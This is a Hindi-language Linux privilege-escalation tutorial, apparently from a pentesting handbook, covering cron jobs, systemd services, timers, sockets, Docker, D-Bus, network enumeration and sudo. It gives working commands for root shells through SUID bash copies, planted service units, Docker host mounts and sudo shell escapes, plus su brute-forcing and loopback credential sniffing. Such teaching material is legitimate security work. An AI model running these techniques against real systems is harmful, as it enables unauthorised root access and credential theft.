कोई सामान्य user, जो root cron job द्वारा चलाई जाने वाली सटीक binary में लिख सकता है, privilege boundary पार कर सकता है; लेकिन custom signature check unsigned replacement को अस्वीकार कर सकती है। दर्ज मामले में, root-owned ELF का mode `0760` था, जिससे उसके group का सदस्य उसमें लिख सकता था, जबकि root owner उसे execute कर सकता था। एक visible process trace से पता चला कि job के binary चलाने से पहले `objcopy` `.text_sig` निकाल रहा था; पूरा verifier script पढ़ा नहीं जा सकता था।<sup>[[2]](#references)</sup>

सफल replacement को ELF signer का इस्तेमाल करके leaked private signing material से sign किया गया था। इसका [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) executable के `.text` से बने signature section का वर्णन करता है। केवल `.text_sig` में certificate या matching string जोड़ना, unseen verifier को संतुष्ट करने के लिए पर्याप्त साबित नहीं किया गया है। यह निष्कर्ष निकालने से पहले कि writable signed binary का exploit किया जा सकता है, वास्तविक scheduled path, प्रभावी write access, root invocation और verifier policy जाँचें। `.text_sig` section अपने आप में केवल जाँच के लिए एक संकेत है।

### बार-बार चलने वाले cron jobs

आप उन processes को खोजने के लिए processes की निगरानी कर सकते हैं, जिन्हें हर 1, 2 या 5 मिनट में execute किया जाता है। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **1 मिनट तक हर 0.1 सेकंड में निगरानी करने**, **कम बार execute हुए commands को पहले sort करने** और सबसे अधिक बार execute हुए commands को हटाने के लिए, आप यह कर सकते हैं:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**आप** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **का भी उपयोग कर सकते हैं** (यह शुरू होने वाली हर process पर नज़र रखेगा और उसकी सूची बनाएगा)।

### ऐसे Root backups जो attacker द्वारा सेट किए गए mode bits को बरकरार रखते हैं (pg_basebackup)

यदि root-owned cron, ऐसी database directory पर `pg_basebackup` (या कोई recursive copy) चलाता है जिसमें आप लिख सकते हैं, तो आप एक **SUID/SGID binary** रख सकते हैं, जिसे backup output में उन्हीं mode bits के साथ **root:root** के रूप में दोबारा कॉपी किया जाएगा।<sup>[[26]](#references)</sup>

खोज का सामान्य तरीका (कम privilege वाले DB user के रूप में):
- `pspy` का उपयोग करके ऐसी root cron job का पता लगाएँ, जो हर मिनट कुछ इस तरह चलाती हो: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`।
- पुष्टि करें कि source cluster (जैसे, `/var/lib/postgresql/14/main`) में आप लिख सकते हैं और job चलने के बाद destination (`/opt/backups/current`) का मालिक root बन जाता है।

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

यह इसलिए काम करता है क्योंकि `pg_basebackup` cluster की कॉपी बनाते समय file mode bits को सुरक्षित रखता है; root द्वारा चलाए जाने पर destination files को **root ownership + attacker द्वारा चुना गया SUID/SGID** मिलता है। इसी तरह permissions सुरक्षित रखने वाली और executable location में लिखने वाली कोई भी privileged backup/copy routine vulnerable होती है।

### अदृश्य cron jobs

एक cronjob बनाना संभव है **जिसमें comment के बाद carriage return हो** (बिना newline character के), और cron job काम करेगी। उदाहरण (carriage return char पर ध्यान दें):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

इस तरह की stealth entry का पता लगाने के लिए, ऐसे tools का उपयोग करके cron files की जाँच करें जो control characters दिखाते हैं:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल में लिख सकते हैं। अगर हाँ, तो आप उसे **बदल सकते हैं**, ताकि सर्विस **शुरू**, **रीस्टार्ट** या **बंद** होने पर आपकी **बैकडोर execute हो** (शायद आपको मशीन के रीबूट होने तक इंतज़ार करना पड़े)।\
उदाहरण के लिए, `.service` फ़ाइल के अंदर अपनी बैकडोर इस तरह बनाएँ: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य सर्विस बाइनरी

ध्यान रखें कि अगर आपके पास सर्विस द्वारा execute की जा रही बाइनरी पर **write permissions** हैं, तो आप उन्हें बैकडोर से बदल सकते हैं, ताकि सर्विस के दोबारा execute होने पर बैकडोर execute हो जाएँ।

### systemd PATH - सापेक्ष पथ

आप systemd द्वारा इस्तेमाल किया गया PATH इस कमांड से देख सकते हैं:

```bash
systemctl show-environment
```

अगर आपको path के किसी भी folder में **write** करने की अनुमति मिलती है, तो आप **privileges escalate** कर सकते हैं। आपको service configuration files में इस्तेमाल हो रहे **relative paths** खोजने चाहिए, जैसे:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

फिर, जिस relative path binary का नाम है, उसी नाम से एक **executable** ऐसी systemd PATH folder के अंदर बनाएँ जहाँ आप लिख सकते हैं। जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने को कहा जाएगा, तो आपका **backdoor execute होगा** (आमतौर पर unprivileged users services को start/stop नहीं कर सकते, लेकिन जाँचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में अधिक जानने के लिए `man systemd.service` देखें।**

## **Timers**

**Timers** ऐसी systemd unit files हैं जिनके नाम `**.timer**` पर समाप्त होते हैं और जो `**.service**` files या events को नियंत्रित करते हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है, क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronous रूप से चलाया जा सकता है।

आप सभी timers की सूची इस तरह देख सकते हैं:

```bash
systemctl list-timers --all
```

### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो उससे systemd.unit की कुछ इकाइयाँ निष्पादित करवा सकते हैं (जैसे `.service` या `.target`)।

```bash
Unit=backdoor.service
```

डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि यूनिट क्या है:

> टाइमर के समाप्त होने पर सक्रिय की जाने वाली यूनिट। आर्ग्युमेंट एक यूनिट का नाम है, जिसका suffix ".timer" नहीं होता। यदि निर्दिष्ट न किया जाए, तो यह मान डिफ़ॉल्ट रूप से उसी नाम वाली service होता है जो timer unit का नाम है, suffix को छोड़कर। (ऊपर देखें।) यह अनुशंसित है कि सक्रिय की जाने वाली यूनिट और timer unit के नाम suffix को छोड़कर एक जैसे हों।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको यह करना होगा:

- कोई systemd unit (जैसे `.service`) ढूँढ़ें जो **लिखने योग्य binary चला रही हो**
- कोई systemd unit ढूँढ़ें जो **relative path चला रही हो** और जिस पर आपके पास **systemd PATH में लिखने के अधिकार** हों (ताकि उस executable का रूप धारण कर सकें)

**`man systemd.timer` से timers के बारे में और जानें।**

### **टाइमर सक्षम करना**

टाइमर सक्षम करने के लिए आपको root privileges चाहिए और यह चलाना होगा:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर symlink बनाकर **activate** किया जाता है।

## Sockets

Unix Domain Sockets (UDS), client-server मॉडल में एक ही या अलग-अलग मशीनों पर **process communication** सक्षम करते हैं। ये कंप्यूटरों के बीच संचार के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के ज़रिए सेट अप किए जाते हैं।<sup>[[14]](#references)</sup>

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**`man systemd.socket` से sockets के बारे में और जानें।** इस file में कई दिलचस्प parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं, लेकिन इनका सार यह **बताता है कि socket कहाँ listen करेगा** (AF_UNIX socket file का path, listen करने के लिए IPv4/6 और/या port number आदि)।
- `Accept`: Boolean argument लेता है। यदि **true** है, तो हर incoming connection के लिए एक **service instance शुरू किया जाता है** और उसे केवल connection socket दिया जाता है। यदि **false** है, तो सभी listening sockets स्वयं **शुरू की गई service unit को दिए जाते हैं**, और सभी connections के लिए केवल एक service unit शुरू होती है। Datagram sockets और FIFOs के लिए इस मान को अनदेखा किया जाता है, जहाँ एक ही service unit बिना शर्त सभी incoming traffic संभालती है। **डिफ़ॉल्ट मान false है**। Performance के कारणों से, नए daemons को केवल इस तरह लिखने की सलाह दी जाती है कि वे `Accept=no` के साथ काम करें।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **बनाए और bind किए जाने से पहले** या **बाद में** चलाया जाता है। Command line का पहला token absolute filename होना चाहिए, जिसके बाद process के arguments हों।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands**, जिन्हें listening **sockets**/FIFOs के **बंद और हटाए जाने से पहले** या **बाद में** चलाया जाता है।
- `Service`: incoming traffic पर **activate** की जाने वाली **service** unit का नाम बताता है। यह setting केवल Accept=no वाले sockets के लिए मान्य है। डिफ़ॉल्ट रूप से यह उसी नाम वाली service होती है जो socket के नाम पर है (suffix बदलकर)। ज़्यादातर मामलों में, इस विकल्प का उपयोग करना आवश्यक नहीं होना चाहिए।

### Writable .socket files

अगर आपको कोई **writable** `.socket` file मिले, तो आप `[Socket]` section की शुरुआत में कुछ ऐसा **जोड़** सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और socket बनने से पहले backdoor चल जाएगा। इसलिए, आपको **संभवतः मशीन के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि system में इस socket file configuration का उपयोग होना चाहिए, वरना backdoor नहीं चलेगा_

### Socket activation + writable unit path (लापता service बनाना)

एक और गंभीर misconfiguration है:

- `Accept=no` और `Service=<name>.service` वाली socket unit
- संदर्भित service unit मौजूद न हो
- attacker `/etc/systemd/system` (या किसी अन्य unit search path) में लिख सकता हो

ऐसी स्थिति में, attacker `<name>.service` बना सकता है, फिर socket पर traffic भेजकर systemd को नई service root के रूप में load और execute करने के लिए trigger कर सकता है।

संक्षिप्त प्रक्रिया:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Writable sockets

अगर आप **कोई writable socket पहचानते हैं** (_यहाँ हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket के साथ communication कर सकते हैं** और शायद किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets की सूची बनाएँ

```bash
netstat -a -p --unix
```

### रॉ कनेक्शन

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation का उदाहरण:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **HTTP requests के लिए सुनने वाले sockets** हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ, बल्कि उन files की जो unix sockets की तरह काम करती हैं_)। आप इसे इस तरह जाँच सकते हैं:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

यदि socket किसी **HTTP** request का **जवाब देता है**, तो आप उससे **कम्युनिकेट** कर सकते हैं और शायद **किसी vulnerability का exploit** कर सकते हैं।

### लिखने योग्य Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, `root` user और `docker` group के सदस्यों को इसमें लिखने की अनुमति होती है। इस socket पर write access होने से privilege escalation हो सकता है। इसे करने का तरीका और Docker CLI उपलब्ध न होने पर वैकल्पिक विधियाँ नीचे दी गई हैं।

#### **Docker CLI से Privilege Escalation**

अगर आपके पास Docker socket पर write access है, तो आप इन commands का उपयोग करके privilege escalation कर सकते हैं:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

ये commands आपको host के file system तक root-level पहुंच के साथ container चलाने देती हैं।

#### **Docker API का सीधे उपयोग करना**

ऐसी स्थितियों में, जब Docker CLI उपलब्ध न हो, तब भी Unix socket पर raw HTTP का उपयोग करके Docker socket का दुरुपयोग किया जा सकता है। सबसे विश्वसनीय तरीका यह है:

- host root को bind-mount करके एक लंबे समय तक चलने वाला helper container बनाएं
- उसे start करें
- उस helper के अंदर एक `exec` instance बनाएं
- `exec` instance को start करें और API के ज़रिए output वापस पढ़ें

**Docker images की सूची बनाएं**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**एक सहायक कंटेनर बनाएँ और शुरू करें**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**एक exec instance बनाएं**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance शुरू करें और output पढ़ें**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

यह pattern आमतौर पर `attach` को `socat` या `nc -U` से manually चलाने की कोशिश करने की तुलना में अधिक robust होता है। `/:/host` के साथ helper बना पाने के बाद, आप `/host/root/...` जैसी files पढ़ने, `/host/root/.ssh` में SSH keys जोड़ने या host startup files में बदलाव करने के लिए अतिरिक्त `exec` instances का उपयोग कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास **`docker` group के अंदर होने के कारण** docker socket पर write permissions हैं, तो आपके पास [**privileges escalate करने के और तरीके**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API किसी port पर listening कर रही है**, तो आप उससे भी compromise कर सकते हैं](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**Containers से बाहर निकलने या privileges escalate करने के लिए container runtimes का दुरुपयोग करने के और तरीके** यहाँ देखें:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आपको पता चले कि आप **`ctr`** command का उपयोग कर सकते हैं, तो अगला page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आपको पता चले कि आप **`runc`** command का उपयोग कर सकते हैं, तो अगला page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है, जो applications को कुशलतापूर्वक आपस में interact करने और data साझा करने में सक्षम बनाता है। आधुनिक Linux system को ध्यान में रखकर डिज़ाइन किया गया यह system, applications के बीच विभिन्न प्रकार के communication के लिए एक robust framework प्रदान करता है।<sup>[[16]](#references)</sup>

यह system versatile है और basic IPC को support करता है, जो processes के बीच data exchange को बेहतर बनाता है और **enhanced UNIX domain sockets** की याद दिलाता है। इसके अलावा, यह events या signals broadcast करने में मदद करता है, जिससे system components के बीच seamless integration संभव होता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon का signal music player को mute करने के लिए प्रेरित कर सकता है, जिससे user experience बेहतर होता है। इसके अतिरिक्त, D-Bus remote object system को support करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और उन processes को सुव्यवस्थित करता है जो पहले जटिल हुआ करते थे।

D-Bus **allow/deny model** पर काम करता है और matching policy rules के संचयी प्रभाव के आधार पर message permissions (method calls, signal emissions आदि) को manage करता है। ये policies bus के साथ होने वाले interactions को निर्दिष्ट करती हैं और इन permissions के exploitation के ज़रिए privilege escalation संभव हो सकता है।

ऐसी policy का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है। इसमें root user को `fi.w1.wpa_supplicant1` का owner होने, उसे messages भेजने और उससे messages प्राप्त करने की permissions का विवरण है।

बिना निर्दिष्ट user या group वाली policies सभी पर लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट policies cover नहीं करतीं।

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

यदि कोई सक्रिय `/etc/inetd.conf` entry GNU Inetutils `telnetd` को root के रूप में चलाती है, तो configured binary version और local listener की जाँच करें, भले ही port केवल loopback पर bind हो। GNU Inetutils 1.9.3 से 2.7 तक में एक [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) था, जिसमें client द्वारा दिया गया `USER`, `login -f` तक पहुँचता था (CVE-2026-24061)। कोई process या version string केवल एक संकेत है; इसे exposed मानने से पहले vendor patch status और वास्तविक daemon की पुष्टि करें। [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) में अधिक जानकारी है।

### Outbound filtering की त्वरित जाँच

यदि host commands चला सकता है, लेकिन callbacks विफल होते हैं, तो DNS, transport, proxy और route filtering को तुरंत अलग-अलग जाँचें:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### खुले ports

मशीन तक पहुँचने से पहले, उस पर चल रही उन network services की हमेशा जाँच करें जिनके साथ आप interact नहीं कर पाए थे:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Bind target के आधार पर listeners को वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी local interfaces पर exposed।
- `127.0.0.1` / `::1`: केवल local (tunnel/forward के लिए अच्छे candidates)।
- विशिष्ट internal IPs (जैसे `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल internal segments से reachable।

### केवल-local services की triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` से bound services अक्सर पहली बार आपके shell से reachable हो जाती हैं। एक त्वरित local workflow यह है:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### नेटवर्क स्कैनर के रूप में LinPEAS (केवल-नेटवर्क मोड)

स्थानीय PE जाँचों के अलावा, linPEAS एक केंद्रित नेटवर्क स्कैनर के रूप में चल सकता है। यह `$PATH` में उपलब्ध बाइनरी का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई टूल इंस्टॉल नहीं करता।

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

यदि आप `-t` के बिना `-d`, `-p` या `-i` पास करते हैं, तो linPEAS एक शुद्ध network scanner की तरह काम करता है (बाकी privilege-escalation checks छोड़कर)।

### Sniffing

जाँचें कि क्या आप traffic sniff कर सकते हैं। यदि कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।

```
timeout 1 tcpdump
```

त्वरित व्यावहारिक जाँचें:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) post-exploitation में विशेष रूप से उपयोगी है, क्योंकि कई केवल-आंतरिक सेवाएँ वहाँ tokens/cookies/credentials उजागर करती हैं:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

अभी कैप्चर करें, बाद में पार्स करें:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## उपयोगकर्ता

### Generic Enumeration

जाँचें कि आप **कौन** हैं, आपके पास कौन-से **privileges** हैं, systems में कौन-से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### बड़ा UID

Linux के कुछ संस्करण एक ऐसे bug से प्रभावित थे, जो **UID > INT_MAX** वाले users को privileges escalate करने देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674)।<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**इसे Exploit करें**: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप **किसी ऐसे समूह के सदस्य हैं** जो आपको root privileges दे सकता है:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड में कोई दिलचस्प चीज़ मौजूद है या नहीं (यदि संभव हो)।

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### पासवर्ड नीति

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### ज्ञात पासवर्ड

अगर आपको environment का **कोई भी पासवर्ड पता है**, तो उस पासवर्ड का इस्तेमाल करके **हर user के रूप में login करने की कोशिश करें**।

### Su Brute

अगर आपको ज़्यादा noise करने से कोई आपत्ति नहीं है और कंप्यूटर पर `su` तथा `timeout` binaries मौजूद हैं, तो [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का इस्तेमाल करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) भी `-a` parameter के साथ users को brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

अगर आपको पता चलता है कि आप **$PATH के किसी folder में लिख सकते हैं**, तो writable folder में किसी ऐसे command के नाम से **backdoor बनाकर privileges escalate** कर सकते हैं, जिसे कोई दूसरा user (आदर्श रूप से root) चलाने वाला हो और जो $PATH में आपके writable folder से पहले मौजूद किसी folder से **load न होता हो**।

### SUDO और SUID

आपको sudo का इस्तेमाल करके कोई command चलाने की अनुमति हो सकती है, या उस पर suid bit सेट हो सकता है। इसे जाँचने के लिए यह चलाएँ:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

कुछ **अप्रत्याशित कमांड आपको फ़ाइलें पढ़ने और/या लिखने, या यहाँ तक कि कोई कमांड निष्पादित करने की अनुमति देते हैं**।<sup>[[8]](#references)</sup> उदाहरण के लिए:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo configuration किसी user को password जाने बिना किसी दूसरे user के privileges के साथ कुछ commands चलाने की अनुमति दे सकती है।

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

इस उदाहरण में user demo, root के रूप में vim चला सकता है; इसलिए root directory में ssh key जोड़कर या sh चलाकर shell पाना अब आसान है।

```
sudo vim -c '!sh'
```

### sudo script में unquoted Bash comparison

Bash में, `[[ "$protected" == $candidate ]]` का दायाँ पक्ष एक pattern होता है। यदि root-capable sudo script `candidate` को caller-controlled file से भरती है, तो `prefix*` जैसी value किसी protected string की शुरुआत से match हो सकती है। सफलता और त्रुटि के अलग-अलग paths तब prefix oracle उजागर कर सकते हैं। जब literal equality का इरादा हो, तो दाएँ पक्ष को quote करें (`[[ "$protected" == "$candidate" ]]`)। किसी unquoted comparison को exploitable मानने से पहले, वास्तविक sudo arguments, input provenance और दिखाई देने वाले branch behavior की समीक्षा करें। [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) इस pattern behavior को परिभाषित करता है।

### sudo के तहत PrusaSlicer project files

